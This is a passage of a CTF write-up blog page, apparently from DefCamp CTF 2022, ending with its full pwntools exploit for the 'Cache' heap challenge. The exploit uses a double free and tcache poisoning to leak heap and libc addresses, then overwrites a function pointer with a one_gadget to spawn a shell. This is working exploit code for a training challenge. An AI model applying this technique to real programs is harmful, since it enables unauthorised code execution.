+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">59
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">60
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">61
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">62
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">63
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">64
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">65
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">66
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">67
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">68
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">69
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">70
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">71
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">72
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">73
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">74
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">75
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">76
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">77
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">78
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">79
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">80
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">81
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">82
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">83
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">84
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">85
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">86
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">87
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">88
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">89
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">90
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">91
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">92
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">93
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">94
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">95
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">from</span> <span style="color:#0cf;font-weight:bold">pwn</span> <span style="color:#069;font-weight:bold">import</span> <span style="color:#555">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#555">.</span>arch <span style="color:#555">=</span> <span style="color:#c30">&#39;amd64&#39;</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#555">.</span>encoding <span style="color:#555">=</span> <span style="color:#c30">&#39;latin&#39;</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#555">.</span>log_level <span style="color:#555">=</span> <span style="color:#c30">&#39;INFO&#39;</span>
+</span></span><span style="display:flex;"><span>warnings<span style="color:#555">.</span>simplefilter(<span style="color:#c30">&#34;ignore&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#c30">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#c30">1 malloc(admin)
+</span></span></span><span style="display:flex;"><span><span style="color:#c30">2 malloc(student)
+</span></span></span><span style="display:flex;"><span><span style="color:#c30">3 call admin[1]
+</span></span></span><span style="display:flex;"><span><span style="color:#c30">4 edit student
+</span></span></span><span style="display:flex;"><span><span style="color:#c30">5 print student
+</span></span></span><span style="display:flex;"><span><span style="color:#c30">6 free admin
+</span></span></span><span style="display:flex;"><span><span style="color:#c30">7 free student
+</span></span></span><span style="display:flex;"><span><span style="color:#c30">&#39;&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>libc <span style="color:#555">=</span> ELF(<span style="color:#c30">&#39;./libc.so.6&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r <span style="color:#555">=</span> process(<span style="color:#c30">&#39;./vuln_patched&#39;</span>, env<span style="color:#555">=</span>{})
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># r = remote(&#39;34.159.7.96&#39;, 32552)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">print_student</span>():
+</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;Choice: &#39;</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;5&#39;</span>)
+</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>recvuntil(<span style="color:#c30">b</span><span style="color:#c30">&#39;is &#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> r<span style="color:#555">.</span>recvuntil(<span style="color:#c30">b</span><span style="color:#c30">&#39;</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#39;</span>)<span style="color:#555">.</span>strip()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">new_admin</span>():
+</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;Choice: &#39;</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;1&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">free_admin</span>():
+</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;Choice: &#39;</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;6&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">get_shell</span>():
+</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;Choice: &#39;</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;3&#39;</span>)
+</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>interactive()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">new_student</span>(name):
+</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;Choice: &#39;</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;2&#39;</span>)
+</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;: &#39;</span>, name)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">edit_student</span>(name):
+</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;Choice: &#39;</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;4&#39;</span>)
+</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;: &#39;</span>, name)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">free_student</span>():
+</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;Choice: &#39;</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;7&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Leak heap address by double-free</span>
+</span></span><span style="display:flex;"><span>new_student(<span style="color:#c30">b</span><span style="color:#c30">&#39;a&#39;</span><span style="color:#555">*</span><span style="color:#f60">0x10</span>)
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">for</span> i <span style="color:#000;font-weight:bold">in</span> <span style="color:#366">range</span>(<span style="color:#f60">2</span>): <span style="color:#09f;font-style:italic"># Double free</span>
+</span></span><span style="display:flex;"><span>    free_student()
+</span></span><span style="display:flex;"><span>out <span style="color:#555">=</span> print_student()
+</span></span><span style="display:flex;"><span>heap_address <span style="color:#555">=</span> u64(out<span style="color:#555">.</span>ljust(<span style="color:#f60">8</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;</span><span style="color:#c30;font-weight:bold">\x00</span><span style="color:#c30">&#39;</span>))
+</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">f</span><span style="color:#c30">&#39;Leak heap address: </span><span style="color:#a00">{</span><span style="color:#366">hex</span>(heap_address)<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Set tcache[0x20] to empty</span>
+</span></span><span style="display:flex;"><span>edit_student(p64(<span style="color:#f60">0</span>)) <span style="color:#09f;font-style:italic"># Make the current tcache_entry-&gt;next to null</span>
+</span></span><span style="display:flex;"><span>new_student(<span style="color:#c30">b</span><span style="color:#c30">&#39;a&#39;</span><span style="color:#555">*</span><span style="color:#f60">8</span>) <span style="color:#09f;font-style:italic"># The malloc will use the cached chunk, and because the next is null, tcache[0x20] is now empty</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Populate heap because we will forge the chunk to 0x90 size (1 alloc = 0x20 bytes)</span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Make sure the next of our forged chunk is not the wilderness</span>
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">for</span> i <span style="color:#000;font-weight:bold">in</span> <span style="color:#366">range</span>(<span style="color:#f60">6</span>):
+</span></span><span style="display:flex;"><span>    new_student(p64(<span style="color:#f60">0</span>) <span style="color:#555">+</span> p64(<span style="color:#f60">0x91</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Free the last chunk</span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Overwrite it with our desired address (heap_address + 0x30)</span>
+</span></span><span style="display:flex;"><span>free_student()
+</span></span><span style="display:flex;"><span>edit_student(p64(heap_address<span style="color:#555">+</span><span style="color:#f60">0x30</span>)) <span style="color:#09f;font-style:italic"># tcache[0x20] = last_chunk-&gt;heap_address+0x30</span>
+</span></span><span style="display:flex;"><span>new_student(<span style="color:#c30">b</span><span style="color:#c30">&#39;a&#39;</span><span style="color:#555">*</span><span style="color:#f60">8</span>) <span style="color:#09f;font-style:italic"># Allocate it to last chunk. Now, tcache[0x20] = heap_address+0x30</span>
+</span></span><span style="display:flex;"><span>new_student(<span style="color:#c30">b</span><span style="color:#c30">&#39;a&#39;</span><span style="color:#555">*</span><span style="color:#f60">8</span>) <span style="color:#09f;font-style:italic"># Allocate it to heap_address+0x30. Now, tcache[0x20] = empty and student pointer point to heap_address+0x30</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">for</span> i <span style="color:#000;font-weight:bold">in</span> <span style="color:#366">range</span>(<span style="color:#f60">7</span>):
+</span></span><span style="display:flex;"><span>    free_student() <span style="color:#09f;font-style:italic"># Free it 7 times to fulfill tcache[0x90]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Because tcache[0x90] is full, the next free will put the cached chunk into unsorted bins</span>
+</span></span><span style="display:flex;"><span>free_student() <span style="color:#09f;font-style:italic"># Cache goes to unsorted bins, and its pointer will point to the main_arena</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Now our pointer is pointing to the main_arena. We can leak the libc address by using the print menu,</span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># because the student variable is still a pointer to the freed chunk</span>
+</span></span><span style="display:flex;"><span>out <span style="color:#555">=</span> print_student()
+</span></span><span style="display:flex;"><span>main_arena <span style="color:#555">=</span> libc<span style="color:#555">.</span>symbols[<span style="color:#c30">&#39;main_arena&#39;</span>]
+</span></span><span style="display:flex;"><span>libc_leaked <span style="color:#555">=</span> u64(out<span style="color:#555">.</span>ljust(<span style="color:#f60">8</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;</span><span style="color:#c30;font-weight:bold">\x00</span><span style="color:#c30">&#39;</span>)) <span style="color:#09f;font-style:italic"># We got main_arena+0x60</span>
+</span></span><span style="display:flex;"><span>libc_base <span style="color:#555">=</span> libc_leaked <span style="color:#555">-</span> main_arena <span style="color:#555">-</span> <span style="color:#f60">0x60</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">f</span><span style="color:#c30">&#39;Leak libc base address: </span><span style="color:#a00">{</span><span style="color:#366">hex</span>(libc_base)<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>libc_shell <span style="color:#555">=</span> <span style="color:#f60">0x10a38c</span> <span style="color:#09f;font-style:italic"># one_gadget</span>
+</span></span><span style="display:flex;"><span>shell_addr <span style="color:#555">=</span> libc_base <span style="color:#555">+</span> libc_shell
+</span></span><span style="display:flex;"><span>new_admin() <span style="color:#09f;font-style:italic"># Create new admin</span>
+</span></span><span style="display:flex;"><span>free_admin() <span style="color:#09f;font-style:italic"># Free it</span>
+</span></span><span style="display:flex;"><span>new_student(p64(<span style="color:#f60">0</span>)<span style="color:#555">+</span>p64(shell_addr)) <span style="color:#09f;font-style:italic"># Create new student</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Because of the tcache, now variable admin and student are pointing to the same chunk,</span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># and the chunk data (last 8 bytes) that can be called by the admin is our shell_addr</span>
+</span></span><span style="display:flex;"><span>get_shell()
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="social-media">Social Media <a href="#social-media" class="anchor">#</a></h1>
+<p>Follow me on <a href="https://twitter.com/chovid99" target="_blank" rel="noopener">twitter</a></p>
+
+      </div>
+      
+        
+  <aside class="toc-container">
+    <a href="#" style="font-weight: 700; color: black;">DefCamp CTF 2022</a>
+    <div class="js-toc">
+      <details>
+          <summary>Table of Contents
+          </summary>
+          <div>
+              <nav id="TableOfContents">
+  <ul>
+    <li><a href="#web-intro">web-intro</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#cache">Cache</a>
+      <ul>
+        <li><a href="#intro">Intro</a></li>
+        <li><a href="#initial-analysis">Initial analysis</a></li>
+        <li><a href="#pitfall-solution">Pitfall solution</a></li>
+        <li><a href="#further-analysis">Further analysis</a></li>
+        <li><a href="#full-solution">Full Solution</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+          </div>
+      </details>
+    </div>
+  </aside>
+
+
+      
+    </div>
+
+    
+        <div class="tags">
+            
+                <a href="https://chovid99.github.io/tags/writeup">Writeup</a>
+            
+                <a href="https://chovid99.github.io/tags/defcampctf">DefCampCTF</a>
+            
+                <a href="https://chovid99.github.io/tags/heap">heap</a>
+            
+        </div>
+    
+    
+    
+  <div id="comment">
+    
+    
+  </div>
+
+
+</section>
+
+<script src="/js/tocbot.min.js"></script>
+
+<script type="text/javascript">
+  tocbot.init({
+      
+      tocSelector: '.js-toc',
+      
+      contentSelector: '.js-toc-content',
+      headingSelector: 'h1, h2, h3, h4',
+      orderedList: false,
+      headingLabelCallback: s => s.substr(0, s.length-2),
+      collapseDepth: 2
+  });
+  </script>
+
+    </main>
+    
+    <footer id="footer">
+    
+        <div id="social">
+
+
+    <a class="symbol" href="https://github.com/Chovid99" rel="me" target="_blank">
+        
+        <svg fill="#bbbbbb" width="28" height="28"  viewBox="0 0 72 72" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+    
+    <title>Github</title>
+    <desc>Created with Sketch.</desc>
+    <defs></defs>
+    <g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
+        <g id="Social-Icons---Rounded-Black" transform="translate(-264.000000, -939.000000)">
+            <g id="Github" transform="translate(264.000000, 939.000000)">
+                <path d="M8,72 L64,72 C68.418278,72 72,68.418278 72,64 L72,8 C72,3.581722 68.418278,-8.11624501e-16 64,0 L8,0 C3.581722,8.11624501e-16 -5.41083001e-16,3.581722 0,8 L0,64 C5.41083001e-16,68.418278 3.581722,72 8,72 Z" id="Rounded" fill="#bbbbbb"></path>
+                <path d="M35.9985,13 C22.746,13 12,23.7870921 12,37.096644 C12,47.7406712 18.876,56.7718301 28.4145,59.9584121 C29.6145,60.1797862 30.0525,59.4358488 30.0525,58.7973276 C30.0525,58.2250681 30.0315,56.7100863 30.0195,54.6996482 C23.343,56.1558981 21.9345,51.4693938 21.9345,51.4693938 C20.844,48.6864054 19.2705,47.9454799 19.2705,47.9454799 C17.091,46.4500754 19.4355,46.4801943 19.4355,46.4801943 C21.843,46.6503662 23.1105,48.9634994 23.1105,48.9634994 C25.2525,52.6455377 28.728,51.5823398 30.096,50.9649018 C30.3135,49.4077535 30.9345,48.3460615 31.62,47.7436831 C26.2905,47.1352808 20.688,45.0691228 20.688,35.8361671 C20.688,33.2052792 21.6225,31.0547881 23.1585,29.3696344 C22.911,28.7597262 22.0875,26.3110578 23.3925,22.9934585 C23.3925,22.9934585 25.4085,22.3459017 29.9925,25.4632101 C31.908,24.9285993 33.96,24.6620468 36.0015,24.6515052 C38.04,24.6620468 40.0935,24.9285993 42.0105,25.4632101 C46.5915,22.3459017 48.603,22.9934585 48.603,22.9934585 C49.9125,26.3110578 49.089,28.7597262 48.8415,29.3696344 C50.3805,31.0547881 51.309,33.2052792 51.309,35.8361671 C51.309,45.0917119 45.6975,47.1292571 40.3515,47.7256117 C41.2125,48.4695491 41.9805,49.9393525 41.9805,52.1877301 C41.9805,55.4089489 41.9505,58.0067059 41.9505,58.7973276 C41.9505,59.4418726 42.3825,60.1918338 43.6005,59.9554002 C53.13,56.7627944 60,47.7376593 60,37.096644 C60,23.7870921 49.254,13 35.9985,13" fill="#FFFFFF"></path>
+            </g>
+        </g>
+    </g>
+</svg>
+    </a>
+
+    <a class="symbol" href="https://twitter.com/Chovid99" rel="me" target="_blank">
+        
+        <svg fill="#bbbbbb" width="28" height="28" version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
+	 width="438.536px" height="438.536px" viewBox="0 0 438.536 438.536" style="enable-background:new 0 0 438.536 438.536;"
+	 xml:space="preserve">
+<g>
+	<path d="M414.41,24.123C398.333,8.042,378.963,0,356.315,0H82.228C59.58,0,40.21,8.042,24.126,24.123
+		C8.045,40.207,0.003,59.576,0.003,82.225v274.084c0,22.647,8.042,42.018,24.123,58.102c16.084,16.084,35.454,24.126,58.102,24.126
+		h274.084c22.648,0,42.018-8.042,58.095-24.126c16.084-16.084,24.126-35.454,24.126-58.102V82.225
+		C438.532,59.576,430.49,40.204,414.41,24.123z M335.471,168.735c0.191,1.713,0.288,4.278,0.288,7.71
+		c0,15.989-2.334,32.025-6.995,48.104c-4.661,16.087-11.8,31.504-21.416,46.254c-9.606,14.749-21.074,27.791-34.396,39.115
+		c-13.325,11.32-29.311,20.365-47.968,27.117c-18.648,6.762-38.637,10.143-59.953,10.143c-33.116,0-63.76-8.952-91.931-26.836
+		c4.568,0.568,9.329,0.855,14.275,0.855c27.6,0,52.439-8.565,74.519-25.7c-12.941-0.185-24.506-4.179-34.688-11.991
+		c-10.185-7.803-17.273-17.699-21.271-29.691c4.947,0.76,8.658,1.137,11.132,1.137c4.187,0,9.042-0.76,14.56-2.279
+		c-13.894-2.669-25.598-9.562-35.115-20.697c-9.519-11.136-14.277-23.84-14.277-38.114v-0.571
+		c10.085,4.755,19.602,7.229,28.549,7.422c-17.321-11.613-25.981-28.265-25.981-49.963c0-10.66,2.758-20.747,8.278-30.264
+		c15.035,18.464,33.311,33.213,54.816,44.252c21.507,11.038,44.54,17.227,69.092,18.558c-0.95-3.616-1.427-8.186-1.427-13.704
+		c0-16.562,5.853-30.692,17.56-42.399c11.703-11.706,25.837-17.561,42.394-17.561c17.515,0,32.079,6.283,43.688,18.846
+		c13.134-2.474,25.892-7.33,38.26-14.56c-4.757,14.652-13.613,25.788-26.55,33.402c12.368-1.716,23.88-4.95,34.537-9.708
+		C357.458,149.793,347.462,160.166,335.471,168.735z"/>
+</g>
+</svg>
+
+    </a>
+
+
+</div>
+
+    
+
+    <div class="copyright">
+    
+       © Copyright 
+       2022 
+       <span class="split">
+        <svg fill="#bbbbbb" width="15" height="15" version="1.1" id="heart-15" xmlns="http://www.w3.org/2000/svg" width="15px" height="15px" viewBox="0 0 15 15">
+  <path d="M13.91,6.75c-1.17,2.25-4.3,5.31-6.07,6.94c-0.1903,0.1718-0.4797,0.1718-0.67,0C5.39,12.06,2.26,9,1.09,6.75&#xA;&#x9;C-1.48,1.8,5-1.5,7.5,3.45C10-1.5,16.48,1.8,13.91,6.75z"/>
+</svg>
+       </span>
+       Chovid99
+    
+    </div>
+
+    
+</footer>
+
+
+
+  </body>
+</html>
